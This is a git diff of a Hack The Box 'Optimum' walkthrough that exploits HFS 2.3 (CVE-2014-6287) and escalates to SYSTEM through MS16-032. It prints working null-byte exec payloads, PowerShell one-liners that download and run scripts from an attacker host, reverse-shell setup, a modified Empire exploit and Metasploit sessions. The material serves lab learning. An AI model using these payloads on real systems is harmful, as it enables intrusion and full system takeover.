@@ -8,6 +8,8 @@ image: https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451
 
 <img width="871" height="332" alt="image" src="https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451fcce0b" />
 
+Exploited an outdated HTTP file server to gain initial access, then used a Windows kernel vulnerability to escalate privileges from standard user to SYSTEM. Multiple exploitation methods demonstrated including manual, automated scripts, and Metasploit framework.
+
 ## Recon
 nmap scan result:
 ```
@@ -80,11 +82,15 @@ Nmap done: 1 IP address (1 host up) scanned in 100.67 seconds
 ```
 From this scan result, we find an open `port 80` running `httpfileserver (HTP) 2.3` as the version.
 
+## Initial Foothold
+
 Initially, by visiting the website. We able to proved it. **[HTTP File Server (HFS)](https://rejetto.com/hfs/)** use to setup our machine as a webserver to transfer files without limit of size and speed. 
 
 <img width="882" height="592" alt="image" src="https://github.com/user-attachments/assets/7c2239fa-d4b9-40a5-b885-07f79be5792c" />
 
 Googled for **HFS 2.3** gave away that this version had **[CVE-2014-6287](https://www.exploit-db.com/exploits/49584)**. It is basically exploitable due to it internal scripting language that uses regex. By input `%00` initially inside search param, we would be able to escape and inject **HFS scripting** commands especially **[exec](https://rejetto.com/wiki/index.php%3Ftitle=HFS:_scripting_commands.html)**. Example: `{.exec|notepad.}`
+
+### Manual Exploitation
 
 We can try those with intercepting by using burpsuite. As i said, initially we need to have the `%00` null byte sequence followed by malicious code and this case we would want to ping `{.exec|ping 10.10.16.6.}`. Setup `tcpdump` inside our machine to make sure we can verify. As no direct output as response. Here's the command `sudo tcpdump -i tun0`
 
@@ -241,6 +247,7 @@ Setup a webserver and use `exac` to use powershell (make sure to use **64-bit** 
 ```
 %00{.exec|c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8888/Invoke-PowerShellTcp.ps1').}
 ```
+This PowerShell one-liner downloads and executes `Invoke-PowerShellTcp.ps1` directly in memory without saving it to disk.
 
 <img width="1226" height="695" alt="image" src="https://github.com/user-attachments/assets/2b5b9b07-9525-47cf-8685-81541cc28323" />
 
@@ -248,8 +255,10 @@ Should be getting a shell
 
 <img width="713" height="472" alt="image" src="https://github.com/user-attachments/assets/e8a6db7b-a11d-4f00-b6aa-96b6e99707fc" />
 
+### Alternative Method 1: Python Script
 
-Or get shell by using script given by `searchsploit` and mirrored `49584.py`:
+There's 2 easier ways which by using script given from `searchsploit` and mirrored `49584.py`:
+{% raw %}
 ```
 ┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
 └─$ searchsploit hfs 2.3
@@ -276,9 +285,7 @@ Shellcodes: No Results
  Verified: False
 File Type: ASCII text, with very long lines (546)
 Copied to: /home/kryzi/Desktop/HTB/Optimum/49584.py
-```
-We should be having `49584.py`
-```
+
 ┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
 └─$ cat 49584.py
 # Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
@@ -332,9 +339,6 @@ print("payload: ", payload)
 print("\nListening for connection...")
 os.system(f'nc -nlvp {lport}')
 
-```
-Change the ip and port and setup a listener to the exact port
-```
 ┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
 └─$ python3 49584.py 
 
@@ -369,9 +373,10 @@ d----         13/1/2026   7:02 ??            %TEMP%
 
 PS C:\Users\kostas\Desktop> 
 ```
-Of course we can do it by `msfconsole` as well by using `exploit/windows/http/rejetto_hfs_exec` module
 
-### Shell as kostas
+### Alternative Method 2: Metasploit
+
+And also by using `msfconsole` as well which using `exploit/windows/http/rejetto_hfs_exec` module
 
 We successfully able to get a shell as kostas
 ```
@@ -396,7 +401,15 @@ Microsoft Windows [Version 6.3.9600]
 C:\Users\kostas\Desktop>whoami
 whoami
 optimum\kostas
+```
+{% endraw %}
 
+## Privilege Escalation
+
+### Enumeration
+
+We can find user flag from user **"kostas\Desktop"** directory:
+```
 C:\Users\kostas\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -417,7 +430,7 @@ C:\Users\kostas\Desktop>type user.txt
 type user.txt
 dbf90e554885c75f0111d970f1a95d18
 ```
-However, we are denied when trying to access Administrator. Meaning we required to escalate our privilege
+However, we required to escalate our privilege to system to access root flag.
 ```
 C:\Users\kostas\Desktop>cd ../..
 cd ../..
@@ -443,7 +456,10 @@ Access is denied.
 
 C:\Users>
 ```
-Next step? If we are using metasploit framework. Of course, Local Suggester is the best ways
+
+### Local Exploit Suggester
+
+Next step? If we are using metasploit framework. Of course, Local Suggester is the easier way:
 ```
 C:\Users>^Z
 Background channel 2? [y/N]  y
@@ -531,10 +547,13 @@ msf post(multi/recon/local_exploit_suggester) >
 
 msf post(multi/recon/local_exploit_suggester) > 
 ```
+### MS16-032 via Metasploit
+
 Ive tried multiple but one of it that work for me is `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`:
 
-Here's why:
+Here's the explaination from my Claude:
 > Most exploits failed because they were UAC bypasses (need admin group) or had validation issues. MS16-032 worked because it's a true privilege escalation from low-priv user → SYSTEM, which is exactly what you needed. It's one of the most reliable Windows local privesc exploits for Server 2012 R2!
+
 ```
 msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -666,4 +685,168 @@ a66613d0cc1c353b8574adc17fc0800e
 C:\Users\Administrator\Desktop
 ```
 
+## Beyond root
+
+There's another ways that i learned recently which uses sherlock and empire. (Learned from IppSec video walkthrough)
+
+> **[Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)** is a PowerShell script used in penetration testing and ethical hacking to quickly find missing software patches and vulnerabilities on a Windows system that could allow for local privilege escalation
+> 
+> **[Empire](https://github.com/BC-SECURITY/Empire)** is a post-exploitation framework used in penetration testing to maintain control and perform actions on compromised Windows/Linux systems after initial access is gained.
+
+```
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8888/Sherlock.ps1')
+
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Not Vulnerable
+
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053
+CVEID      : 2013-1300
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Not Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+
+Title      : 'mrxdav.sys' WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+             ample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+             tml
+VulnStatus : Not Vulnerable
+
+
+
+PS C:\Users\kostas\Desktop>
+```
+
+From here we can find there are two exploitable CVEs, but I'm choosing `MS16-032`. Googling for MS16-032 exploits returns multiple scripts, one of which is from **[PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)** by FuzzySecurity.
+
+However, we can't use the original script as-is because it spawns a new PowerShell window with SYSTEM privileges on the target machine itself. Since we only have a command-line shell (not RDP or physical access), we wouldn't be able to interact with that spawned PowerShell window - it would open locally on the target machine where we can't see it.
+
+What we need instead is a modified version that sends us a reverse shell with SYSTEM privileges back to our attacker machine. That's why we use the **[Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)** version of the MS16-032 exploit (or modify the original script). The Empire version is essentially the same exploit, but instead of spawning a local PowerShell window, it's modified to execute a reverse shell payload that connects back to us, giving us an interactive SYSTEM shell on our machine.
+
+<img width="942" height="576" alt="image" src="https://github.com/user-attachments/assets/9b37c4c6-638f-4b3c-9b74-de0a853a0e14" />
+
+First, we need to edit the **Empire version** of `Invoke-MS16032.ps1` to change what it executes after exploiting the vulnerability.
+
+**Find this section in the script** (near the end):
+```powershell
+$StartTokenRace.Stop()
+$SafeGuard.Stop()
+```
+
+**Add this line after it:**
+```powershell
+Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.6:8888/shell.ps1')"
+```
+
+This tells the exploit: *"After you get SYSTEM privileges, download and execute shell.ps1 from my web server"*
+
+The `shell.ps1` file is actually **Invoke-PowerShellTcp.ps1** from the **[Nishang](https://github.com/samratashok/nishang)** framework, renamed for convenience.
+
+**Edit the bottom of shell.ps1** and add:
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 9877
+```
+
+This function call tells the script to connect back to your attacker machine.
+
+Start a Python web server to serve both scripts:
+```bash
+python3 -m http.server 8888
+```
+
+Your web server will serve:
+- `Invoke-MS16032.ps1` (modified exploit)
+- `shell.ps1` (reverse shell payload)
+
+On your attacker machine, start a netcat listener:
+```bash
+nc -lvnp 9877
+```
+
+<img width="913" height="605" alt="image" src="https://github.com/user-attachments/assets/6dbf0060-895f-4309-970e-b87feaf54067" />
+
+From your compromised shell on the target, run:
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6:8888/Invoke-MS16032.ps1')
+```
+
+And finally we got the shell as **SYSTEM**
+```
+PS C:\Users\kostas\Desktop>whoami                                                              
+nt authority\system                                                                            
+PS C:\Users\kostas\Desktop> cd ../../                                                          
+PS C:\Users> dir                                                                               
+                                                                                               
+                                                                                               
+    Directory: C:\Users                                                                        
+                                                                                               
+                                                                                               
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----         18/3/2017   1:52 ??            Administrator                     
+d----         18/3/2017   1:57 ??            kostas                            
+d-r--         22/8/2013   6:39 ??            Public                            
+                                               
+                                                                                               
+PS C:\Users> cd Administrator/Desktop   
+PS C:\Users\Administrator\Desktop> type root.txt
+a66613d0cc1c353b8574adc17fc0800e
+PS C:\Users\Administrator\Desktop> 
+```
+
 **[Badge](https://labs.hackthebox.com/achievement/machine/1737187/6)**
+
+
